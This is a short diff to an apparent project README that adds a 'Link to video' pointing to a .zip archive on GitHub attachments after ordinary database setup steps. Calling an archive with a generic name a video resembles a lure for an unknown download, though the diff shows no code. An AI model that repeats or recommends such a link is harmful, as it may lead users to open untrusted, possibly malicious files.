@@ -98,4 +98,7 @@ This is implemented using MarketVendor
 2. Run data.sql to insert sample data.
 3. Use queries.sql as reference for application queries.
 
+Link to video
+[video1385382156.zip](https://github.com/user-attachments/files/24138776/video1385382156.zip)
+
 
